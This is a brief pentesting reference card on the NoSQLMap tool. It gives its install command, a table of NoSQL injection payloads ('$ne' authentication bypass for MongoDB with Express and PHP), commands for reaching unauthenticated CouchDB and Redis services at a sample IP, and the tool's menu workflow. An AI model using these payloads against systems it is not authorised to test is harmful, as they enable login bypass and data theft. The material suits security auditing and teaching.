# 🛠️ Tool Master Guide: NoSQLMap & Document Database Suite

> [!INFO] 📋 **Root Metadata**
> - **Tool Name**: NoSQLMap
> - **Category**: NoSQL Database Vulnerability Scanner & BSON Injection Framework
> - **License**: Open Source (GPL-3.0)
> - **Installation Command**: `git clone https://github.com/codingo/NoSQLMap.git && cd NoSQLMap && python setup.py install`
> - **Primary Objective**: Auditing MongoDB and CouchDB applications for BSON injection, authentication bypass (`{"$ne": null}`), unauthenticated administrative access, and arbitrary data extraction.

---

## 📋 1. NoSQL Injection Operators & Bypasses

| Vulnerable Technology | Attack Payload Pattern | Vulnerability Mechanism |
| :--- | :--- | :--- |
| **MongoDB / Express** | `{"username": {"$ne": null}, "password": {"$ne": null}}` | BSON `$ne` (Not Equal) operator bypasses authentication checks |
| **MongoDB / PHP** | `username[$ne]=admin&password[$ne]=admin` | Array parameter manipulation forcing `$ne` query execution |
| **CouchDB HTTP REST** | `http://10.10.10.50:5984/_all_dbs` | Unauthenticated HTTP administrative REST API access |
| **Redis Memory DB** | `redis-cli -h 10.10.10.50 CONFIG GET *` | Unauthenticated Redis TCP port 6379 key and config access |

---

## 💻 2. Operational Workflows

```bash
# 1. Launch NoSQLMap Interactive Shell
python NoSQLMap.py

# 2. Set Target Host IP & Web App Parameters -> Execute MongoDB BSON Operator Injection Audit
# Target Options -> Set Target Host IP -> Web App Attacks -> Scan Web App Parameters
```
